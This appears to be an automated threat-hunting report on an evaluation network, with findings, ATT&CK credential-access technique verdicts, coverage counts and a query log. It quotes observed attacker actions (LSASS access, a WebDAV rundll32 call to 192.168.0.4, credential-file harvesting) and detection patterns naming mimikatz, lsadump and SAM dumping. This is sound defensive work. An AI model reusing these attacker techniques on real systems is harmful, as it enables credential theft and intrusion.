The only T1621 check with hits (C316, windows.other, event.code 7045/5857/5858) returned 90 events that are not MFA request generation. 49x event.code 5858 and 36x event.code 5857 are routine WMI provider start/DeleteInstance messages on newyork.dmevals.local (e.g. 'dsccore provider started with result code 0x0', 'Start IWbemServices::DeleteInstance - Root\Rsop\Computer'), all under SYSTEM/NETWORK SERVICE. The 5x event.code 7045 service installs are PsExec tooling: 4x PSEXESVC on nashua.dmevals.local (demand start, %SystemRoot%\PSEXESVC.exe) and 1x 'Java(TM) Virtual Machine Support Service' (C:\Windows\System32\javamtsup.exe) on scranton.dmevals.local, all installed by user pbeesly. Corroborating windows.security 4648 events show pbeesly explicitly authenticating from scranton.dmevals.local (source.ip 10.0.1.6) to NASHUA and PSEXESVC.exe performing localhost logons on nashua.dmevals.local, and windows.sysmon shows C:\Windows\PSEXESVC.exe executing on nashua.dmevals.local as SYSTEM. This is PsExec-based remote execution/lateral movement, not multi-factor authentication request generation. No 4625 failed-logon events exist in windows.security (C314/C315 zero hits), no MFA/2FA/Authenticator/OTP PowerShell script blocks exist (C317 zero hits; independent 4104 search for MFA/2FA/Authenticator/OneTime/OTP also zero), no MFA/2FA command lines in sysmon (C318 zero hits), and no mfa/auth/otp/2fa HTTP URLs in zeek (C319 zero hits; independent search also zero). No evidence of MFA fatigue/request-generation activity.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:28.000Z | newyork.dmevals.local | windows.other | message | dsccore provider started with result code 0x0. HostProcess = wmiprvse.exe; ProcessID = 5344; ProviderPath = %systemroot%\system32\DscCore.dll | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8Rp | q-27e0057508 | ok |
| 2 | 2020-05-02 02:56:47.000Z | newyork.dmevals.local | windows.other | message | Id = {C11E1664-7828-4AD0-B23A-0FCEF0EA26C0}; ClientMachine = NEWYORK; User = NT AUTHORITY\SYSTEM; ClientProcessId = 1588; Component = Unknown; Operation = Start… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8Rl | q-f748dcb550 | ok |
| 3 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | win.ServiceName | PSEXESVC | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrYMQT | q-df9d29bc5c | ok |
| 4 | 2020-05-02 03:04:15.000Z | scranton.dmevals.local | windows.other | win.ServiceName | Java(TM) Virtual Machine Support Service | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8TL | q-df9d29bc5c | ok |
| 5 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-96537f8cdc | ok |
| 6 | 2020-05-02 03:11:39.934Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItUGBlWZ | q-dd49336344 | ok |

### F52 · benign / medium · T1649 · ROOT certificate store registry value modified on nashua.dmevals.local

Evidence status: **verified**

On nashua.dmevals.local a registry value under \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\BE36A4562FB2EE05DBB3D32323ADF445084ED656 (value name "Blob") was modified (Security EID 4657, subject NASHUA$ / S-1-5-18). The modifying process is C:\Windows\Sysmon.exe, i.e. the Sysmon service account performing a routine certificate-store update, not an adversary tool. No attacker-controlled process or export activity is associated with this change, so it is assessed as benign certificate-store maintenance rather than certificate theft/forgery.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\BE36A4562FB2EE05DBB3D32323ADF445084ED656 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ6CoZN | q-34d4ff3f1d | ok |
| 2 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\Sysmon.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ6CoZN | q-34d4ff3f1d | ok |
| 3 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | user.name | NASHUA$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ6CoZN | q-34d4ff3f1d | ok |

## Technique conclusions

One line per technique in scope: status from the triage of its family; `not_observed` = checked, nothing found; `not_observable` = no dataset records it.

| Technique | Status | Reason |
|---|---|---|
| T1003 OS Credential Dumping | malicious | New host nashua.dmevals.local shows the same credential-access tooling chain: PsExec (PSEXESVC.exe) staging a PyInstaller python.exe that drops Rar.exe/sdelete64.exe and drives PowerShell credential-file harvesting. |
| T1003.001 LSASS Memory | suspicious | New corroborating event: powershell.exe (pbeesly) opened scranton lsass.exe with AccessMask 0x10 (PROCESS_VM_READ) at 03:05:16, matching the anchored LSASS-dump pattern; no new dump file observed in this window. |
| T1003.002 Security Account Manager | not_observed | No SAM/SECURITY hive file access, reg save, or 4663 SAM/SECURITY object access found. |
| T1003.003 NTDS | not_observed | No ntds.dit file access or vssadmin/ntdsutil/diskshadow activity found. |
| T1003.004 LSA Secrets | benign | 4662 LSA SecretObject queries are routine LOCAL SERVICE reads of Policy\Secrets\$MACHINE.ACC; no adversary LSA Secrets dumping. |
| T1003.005 Cached Domain Credentials | not_observed | No access to SECURITY\Cache objects or cachedump/dcc2 script blocks found. |
| T1003.006 DCSync | not_observed | No drsuapi/dcsync/lsadump activity; the only DS 4662 was a machine-account Control Access, not replication. |
| T1040 Network Sniffing | benign | The single packet-capture event (netsh trace start capture=yes on scranton.dmevals.local, 2020-05-02T03:19:17Z) was executed as SYSTEM by the Microsoft Azure NetworkWatcherAgent service, followed by netsh trace stop and … |
| T1056 Input Capture | malicious | PowerShell.exe (PID 2976, SYSTEM) opened lsass.exe with GrantedAccess 0x1fffff (PROCESS_ALL_ACCESS) on scranton.dmevals.local at 03:05:16, in the same session that ran the keylogger/screen-capture toolkit. |
| T1056.001 Keylogging | malicious | Get-Keystrokes invoked by user pbeesly on scranton.dmevals.local, preceded by a Keystroke-Check AV-evasion function; classic PowerShell keylogger. |
| T1056.002 GUI Input Capture | malicious | Invoke-ScreenCapture (looping virtual-screen screenshots) and Get-Clipboard executed in the same pbeesly session on scranton.dmevals.local. |
| T1056.003 Web Portal Capture | not_observed | All web-portal capture checks (C071-C073, C075) returned zero hits; no aspx/php/wwwroot/login artifacts. |
| T1056.004 Credential API Hooking | not_observed | No SetWindowsHookEx/GetAsyncKeyState strings in script blocks or command lines, and no lsass/MiniDump/procdump messages in windows.other (C084 zero hits). |
| T1110 Brute Force | not_observed | No failed-logon events (4625/4771) exist in the data; the only 4776 NTLM validation is a success (win.Status 0x0). No brute-force tooling or authentication-failure pattern was found. |
| T1110.001 Password Guessing | not_observed | No 4625 failures and no processes launched with password arguments for logon attempts; PowerShell 'Password'/'Credential' hits are hardcoded secrets for cert export and WebDAV copy, not guessing. |
| T1110.002 Password Cracking | not_observed | No hashcat/john/crack execution and no wordlist/potfile/hash file creation. LSASS full-access handles from PowerShell (0x1f3fff/0x1fffff) indicate credential dumping (T1003), not offline cracking. |
| T1110.003 Password Spraying | not_observed | No 4625/4771 failures and no one-password-many-accounts pattern; the 4648 explicit-credential logons are a single account (pbeesly) via PSEXESVC lateral movement. |
| T1110.004 Credential Stuffing | not_observed | No failed authentication events at all, so no stuffing attempts; the single 4776 validation is a success for pbeesly. |
| T1111 Multi-Factor Authentication Interception | not_observed | No MFA-interception artifacts in any dataset: LSASS access is benign svchost/AV reads (GrantedAccess 0x1000, 286 events), no smartcard/OTP/token-theft tooling, no credential-provider or MFA registry tampering, and no Pow… |
| T1187 Forced Authentication | malicious | On scranton.dmevals.local, user pbeesly's PowerShell session created a StartUp .lnk and downloaded OfficeSupplies.7z, then repeatedly ran 'rundll32.exe davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' — th… |
| T1212 Exploitation for Credential Access | not_observed | No exploitation of a software vulnerability for credential access was found. All 326 LSASS process-access events are benign (svchost.exe 0x1000; Azure AntimalwareConfig.exe/WindowsAzureTelemetryService.exe 0x1400; winini… |
| T1539 Steal Web Session Cookie | not_observed | No access to or copying of browser cookie/session stores (Cookies, Login Data, WebCache) was found in windows.security (4663), windows.sysmon (file-create 11, process-create 1) or windows.powershell (4104). The only cook… |
| T1552 Unsecured Credentials | malicious | New on nashua: staged python.exe (PyInstaller) beaconing to 192.168.0.4:8443 orchestrates the credential-file collection and archive staging. |
| T1552.001 Credentials In Files | malicious | New on nashua: PowerShell recursively collects *pass*/*login*/*admin*/*vpn/*.pst/*.ost files from the user profile into working.zip, then Rar.exe re-archives it with a hardcoded password. |
| T1552.002 Credentials in Registry | not_observed | No access to credential-bearing registry values (DefaultPassword, AutoAdminLogon, SAM/SECURITY) was seen; only routine Winlogon/Lsa system writes. |
| T1552.003 Shell History | not_observed | No ConsoleHost_history/PSReadLine/shell history access or file creation was observed in any dataset. |
| T1552.004 Private Keys | malicious | Confirmed on scranton: powershell.exe wrote C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx at 03:04:57, consistent with the anchored private-key certificate export. |
| T1552.006 Group Policy Preferences | benign | SYSVOL GptTmpl.inf reads were performed by machine accounts (SCRANTON$, NASHUA$) applying Group Policy, not Groups.xml cpassword harvesting. |
| T1555 Credentials from Password Stores | suspicious | PowerShell.exe (SYSTEM) on scranton.dmevals.local opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff (PROCESS_ALL_ACCESS) at 03:05:16Z, the rare outlier among 326 mostly-benign 0x1000 LSASS accesses; consistent wi… |
| T1555.003 Credentials from Web Browsers | not_observed | All browser credential-store checks (command lines, 4663 object access, PowerShell script blocks, other channel) returned zero hits; the only file-creation hit was an unrelated INetCookies file. |
| T1555.004 Windows Credential Manager | benign | LSASS handle access is dominated by benign system processes (svchost, Defender, CollectGuestLogs) with 0x1000/0x10 masks; no cmdkey or vault command lines observed. |
| T1555.005 Password Managers | not_observed | All KeePass/1Password/Bitwarden/LastPass checks (process execution, kdbx files, process access, PowerShell script blocks, service installs) returned zero hits. |
| T1556 Modify Authentication Process | not_observed | No authentication-process modification found. LSASS accesses are dominated by legitimate svchost.exe (0x1000) and AV/telemetry agents; no LSA registry writes, no auth DLL replacement, no service installs targeting auth c… |
| T1556.001 Domain Controller Authentication | not_observed | Only Microsoft-signed modules (lsass.exe, samsrv.dll, wdigest.dll) loaded into lsass on the DCs; no unexpected DLL loads, no 4657 writes to lsass/cryptdll/wdigest/SecurityProviders, no 7045 service installs referencing a… |
| T1556.002 Password Filter DLL | not_observed | No registry writes to Notification Packages / PasswordFilter / LSA keys and no service installs with password/filter image paths. Only routine WMI Autologger and SystemCertificates 4657 writes by the machine account. |
| T1556.005 Reversible Encryption | not_observed | Zero 4739/4738/5136/5137/5141 events; no reversible-encryption or AllowReversiblePasswordEncryption activity in PowerShell, Sysmon or service installs. |
| T1556.006 Multi-Factor Authentication | not_observed | All 4624 logons use standard logon processes (Kerberos/Advapi/User32/NtLmSsp) and Kerberos authentication package; no 4739 policy changes or MFA-related cmdlets observed. |
| T1556.007 Hybrid Identity | not_observed | No directory-service object change events (5136/5137/5141) in windows.security or windows.other; no hybrid/federated identity configuration modification. |
| T1556.008 Network Provider DLL | not_observed | No registry writes to NetworkProvider / SecurityProviders / Winlogon keys; the 4657 events present were WMI Autologger and SystemCertificates writes. |
| T1557 Adversary-in-the-Middle | not_observed | No adversary-in-the-middle activity found. The suspicious activity in the window (PSEXESVC spawning C:\Windows\Temp\python.exe connecting to 192.168.0.4:8443 on nashua) is lateral movement/C2, not interception. |
| T1557.001 Name Resolution Poisoning and SMB Relay | not_observed | SMB connections all target internal hosts (10.0.0.4 DC, 10.0.1.6); zeek SMB is routine IPC$/sysvol/DRS traffic; DNS is normal AD resolution. No SMB relay or name-resolution poisoning. |
| T1557.002 ARP Cache Poisoning | not_observed | Each zeek source MAC maps to a single source IP; no MAC claiming multiple IPs, so no ARP cache poisoning signature. |
| T1557.003 DHCP Spoofing | not_observed | No DHCP events (1341/1342/1020/1063, UDP 5156, dhcp/netsh/route-add) and no UDP 67/68 traffic observed. |
| T1558 Steal or Forge Kerberos Tickets | suspicious | LSASS was accessed with full-read access (0x1F3FFF) by PowerShell on scranton and wsmprovhost on nashua, consistent with credential dumping that could yield Kerberos material, but no actual ticket theft/forgery artifacts… |
| T1558.001 Golden Ticket | not_observed | No forged TGT indicators; all 4769/4768 events are normal successful RC4 Kerberos traffic on newyork.dmevals.local. |
| T1558.002 Silver Ticket | not_observed | No forged service tickets; 4769 service requests target only machine accounts and krbtgt with normal success. |
| T1558.003 Kerberoasting | not_observed | No RC4 TGS requests for user service accounts and no kerberoasting tooling in command lines. |
| T1558.004 AS-REP Roasting | not_observed | All 4768 AS-REQs show PreAuthType 2 (pre-auth enabled); no AS-REP roasting tooling observed. |
| T1606 Forge Web Credentials | not_observed | No forged web credential activity. PowerShell 4104 token/cookie/SAML keyword hit is the benign Sysinternals readme.ps1 Get-AttributesMask helper; logon stack is normal Kerberos/Advapi; 7045/5857/5858 events are PsExec/Ja… |
| T1606.001 Web Cookies | not_observed | Only cookie-store file is a benign Windows service-profile INetCookies created by svchost. No forged/stolen web cookie artifacts. The suspicious cod.3aka3.scr implant is C2 behaviour, not cookie forging. |
| T1606.002 SAML Tokens | not_observed | No SAML assertion or token-forging artifacts in PowerShell script blocks (only Sysinternals/DSC modules) and no SAML HTTP requests in Zeek; Kerberos traffic is normal TGT/TGS issuance. |
| T1621 Multi-Factor Authentication Request Generatio… | not_observed | No MFA request generation activity found. The only hit-bearing check (C316) returned routine WMI provider events (5857/5858) and PsExec service installs (7045), not MFA requests. All MFA-specific checks were empty: no 46… |
| T1649 Steal or Forge Authentication Certificates | malicious | Confirmed on scranton: .pfx certificate file written by PowerShell (coyn5igj.3io.pfx), matching the anchored LocalMachine private-key export. |

## Coverage

Cells: number of hits of the planned checks, `n/a` (reason in report.json), or GAP.

| Technique | windows.other | windows.powershell | windows.security | windows.sysmon | zeek |
|---|---|---|---|---|---|
| T1003 OS Credential Dumping | 5 hits | 0 hits | 5344 hits | 773 hits | n/a |
| T1003.001 LSASS Memory | 5 hits | 0 hits | 116 hits | 655 hits | n/a |
| T1003.002 Security Account Manager | 5 hits | 0 hits | 0 hits | 10 hits | n/a |
| T1003.003 NTDS | 13 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1003.004 LSA Secrets | 5 hits | 0 hits | 0 hits | 353 hits | n/a |
| T1003.005 Cached Domain Credentials | 5 hits | 0 hits | 0 hits | 330 hits | n/a |
| T1003.006 DCSync | 0 hits | 0 hits | 21 hits | 326 hits | n/a |
| T1040 Network Sniffing | 0 hits | 0 hits | 461 hits | 1 hits | n/a |
| T1056 Input Capture | 0 hits | 0 hits | 21954 hits | 39609 hits | n/a |
| T1056.001 Keylogging | 0 hits | 0 hits | 10977 hits | 39309 hits | n/a |
| T1056.002 GUI Input Capture | 0 hits | 4 hits | 460 hits | 0 hits | n/a |
| T1056.003 Web Portal Capture | 0 hits | 2 hits | 0 hits | 0 hits | n/a |
| T1056.004 Credential API Hooking | 0 hits | 3 hits | 19 hits | 60196 hits | n/a |
| T1110 Brute Force | 4 hits | 15 hits | 1 hits | 1 hits | n/a |
| T1110.001 Password Guessing | 2 hits | 4 hits | 0 hits | 0 hits | n/a |
| T1110.002 Password Cracking | 1 hits | 2 hits | 4494 hits | 347 hits | n/a |
| T1110.003 Password Spraying | 4 hits | 22 hits | 15 hits | 0 hits | n/a |
| T1110.004 Credential Stuffing | 4 hits | 4 hits | 0 hits | 0 hits | n/a |
| T1111 Multi-Factor Authentication Interception | 9 hits | 2 hits | 624 hits | 56824 hits | n/a |
| T1187 Forced Authentication | 5 hits | 0 hits | 11140 hits | 1715 hits | 86 hits |
| T1212 Exploitation for Credential Access | 10 hits | 16 hits | 84 hits | 39730 hits | 613 hits |
| T1539 Steal Web Session Cookie | 7 hits | 13 hits | 11294 hits | 41141 hits | 2 hits |
| T1552 Unsecured Credentials | 8 hits | 4 hits | 11294 hits | 19190 hits | 23 hits |
| T1552.001 Credentials In Files | 7 hits | 1 hits | 11146 hits | 2096 hits | 12 hits |
| T1552.002 Credentials in Registry | 5 hits | 1 hits | 0 hits | 7 hits | n/a |
| T1552.003 Shell History | n/a | 0 hits | 0 hits | 0 hits | n/a |
| T1552.004 Private Keys | 5 hits | 0 hits | 0 hits | 1 hits | n/a |
| T1552.006 Group Policy Preferences | 0 hits | 0 hits | 38 hits | 0 hits | n/a |
| T1555 Credentials from Password Stores | 5 hits | 3 hits | 6 hits | 797 hits | n/a |
| T1555.003 Credentials from Web Browsers | 0 hits | 0 hits | 0 hits | 1 hits | n/a |
| T1555.004 Windows Credential Manager | 0 hits | 3 hits | 0 hits | 652 hits | n/a |
| T1555.005 Password Managers | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556 Modify Authentication Process | 0 hits | 0 hits | 0 hits | 727 hits | n/a |
| T1556.001 Domain Controller Authentication | 0 hits | 0 hits | 213 hits | 359 hits | n/a |
| T1556.002 Password Filter DLL | 0 hits | 0 hits | 0 hits | 1 hits | n/a |
| T1556.005 Reversible Encryption | 0 hits | 1 hits | 0 hits | 0 hits | n/a |
| T1556.006 Multi-Factor Authentication | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556.007 Hybrid Identity | 0 hits | 0 hits | 0 hits | 49 hits | n/a |
| T1556.008 Network Provider DLL | 0 hits | 0 hits | 0 hits | 1063 hits | n/a |
| T1557 Adversary-in-the-Middle | 0 hits | 0 hits | 15461 hits | 1310 hits | 613 hits |
| T1557.001 Name Resolution Poisoning and SMB Relay | 5 hits | 0 hits | 46 hits | 147 hits | 613 hits |
| T1557.002 ARP Cache Poisoning | 0 hits | 0 hits | 5059 hits | 1310 hits | 613 hits |
| T1557.003 DHCP Spoofing | 0 hits | 0 hits | 0 hits | 308 hits | n/a |
| T1558 Steal or Forge Kerberos Tickets | 89 hits | 0 hits | 787 hits | 326 hits | 2280 hits |
| T1558.001 Golden Ticket | 89 hits | 0 hits | 28 hits | 326 hits | 105 hits |
| T1558.002 Silver Ticket | 89 hits | 0 hits | 28 hits | 326 hits | 105 hits |
| T1558.003 Kerberoasting | 89 hits | 0 hits | 552 hits | 326 hits | 105 hits |
| T1558.004 AS-REP Roasting | 89 hits | 0 hits | 14 hits | 0 hits | 105 hits |
| T1606 Forge Web Credentials | 90 hits | 1 hits | 312 hits | 39283 hits | 2140 hits |
| T1606.001 Web Cookies | 12 hits | 1 hits | 312 hits | 1 hits | 62 hits |
| T1606.002 SAML Tokens | 90 hits | 0 hits | 312 hits | 0 hits | 0 hits |
| T1621 Multi-Factor Authentication Request Generatio… | 90 hits | 0 hits | 0 hits | 0 hits | 0 hits |
| T1649 Steal or Forge Authentication Certificates | 90 hits | 1 hits | 86 hits | 78693 hits | 756 hits |

Cells: 265, gaps: 0.

## Queries

Every MCP tool call of this run (1061), in order (source: mcp_audit.jsonl written by the MCP server).

| Query | Phase | Tool | Arguments | Hits / rows | Cited by |
|---|---|---|---|---|---|
| q-c610aa3434 | scope | list_data_sources | {} | None |  |
| q-70369311c7 | scope | get_registry | {} | None |  |
| q-4cf5f8368f | scope | get_fields | {"dataset": "windows.other", "prefix": ""} | None |  |
| q-10f451b445 | scope | get_fields | {"dataset": "windows.powershell", "prefix": ""} | None |  |
| q-65e826b08c | scope | get_fields | {"dataset": "windows.security", "prefix": ""} | None |  |
| q-88a7a9c55d | scope | get_fields | {"dataset": "windows.sysmon", "prefix": ""} | None |  |
| q-04bd9a56cd | scope | get_fields | {"dataset": "zeek", "prefix": ""} | None |  |
| q-f00ca8b67d | check C001 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-153356abce | check C002 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-9c656ff776 | check C003 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4663", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 5337 |  |
| q-8280838b9e | check C004 | search | {"dataset": "windows.security", "query": "event.code:4662", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 7 | F05, F06, F07 |
| q-768f6b0f90 | check C005 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*lsass* OR *mimikatz* OR *sekurlsa* OR *DumpCreds*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code",… | 0 |  |
| q-c5c94e1e7f | check C006 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 | F02 |
| q-ddb0325141 | check C007 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-6f7b49440e | check C008 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-edb32adb7a | check C009 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:(*lsass* OR *.dmp)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "proc… | 2 | F04 |
| q-82e95c35f2 | check C010 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.command_line:(*lsass* OR *comsvcs* OR *MiniDump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process… | 1 |  |
| q-7ee5dc5092 | check C011 | search | {"dataset": "windows.security", "query": "event.code:4673 AND win.ProcessName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comman… | 103 |  |
| q-618f493e21 | check C012 | search | {"dataset": "windows.security", "query": "event.code:4656 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command… | 13 |  |
| q-a0be561ddc | check C013 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*lsass* OR *MiniDump* OR *sekurlsa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "… | 0 |  |
| q-dbfde0ceae | check C014 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-9bb7e813f9 | check C015 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:(*SAM* OR *SECURITY* OR *SYSTEM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.exe… | 3 |  |
| q-26b54f07ea | check C016 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND registry.path:(*SAM* OR *SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "proces… | 7 |  |
| q-0f21401d39 | check C017 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND win.TargetFilename:(*SAM* OR *SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pr… | 0 |  |
| q-c8a25617f2 | check C018 | search | {"dataset": "windows.security", "query": "event.code:4688 AND process.command_line:(*reg*save* OR *SAM* OR *SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pro… | 0 |  |
| q-2339e8fa45 | check C019 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectName:(*SAM* OR *SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "p… | 0 |  |
| q-82c76074fc | check C020 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*reg save* OR *SAM* OR *SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-2154398700 | check C021 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-a1c07bd816 | check C022 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:*ntds*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_… | 0 |  |
| q-04cf67038f | check C023 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND win.TargetFilename:*ntds*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_l… | 0 |  |
| q-643c9cc99a | check C024 | search | {"dataset": "windows.security", "query": "event.code:4688 AND process.command_line:(*ntds* OR *vssadmin* OR *ntdsutil* OR *diskshadow*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", … | 0 |  |
| q-689c413799 | check C025 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-614f1cc2e0 | check C026 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*ntds* OR *vssadmin* OR *diskshadow* OR *ntdsutil*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code",… | 0 |  |
| q-5810f7ef6c | check C027 | search | {"dataset": "windows.other", "query": "event.code:2004 OR event.code:2006", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 8 |  |
| q-32122162b8 | check C028 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-d74bf22411 | check C029 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND win.ImageLoaded:(*lsass* OR *samlib* OR *vaultcli*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.execu… | 23 |  |
| q-bbc8f6eb0a | check C030 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.command_line:(*secrets* OR *lsadump* OR *cache*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.… | 4 |  |
| q-ed401f3571 | check C031 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectName:(*SECURITY*Policy*Secrets* OR *SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pro… | 0 |  |
| q-958ea0a5d0 | check C032 | search | {"dataset": "windows.security", "query": "event.code:4656 AND win.ObjectName:*SECURITY*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 0 |  |
| q-0f3abd3933 | check C033 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*lsadump* OR *secrets* OR *cachedump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 0 |  |
| q-1f518e3b65 | check C034 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-837456a970 | check C035 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-5006ca4ae3 | check C036 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.command_line:(*cache* OR *dcc2* OR *mscache*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.exe… | 4 |  |
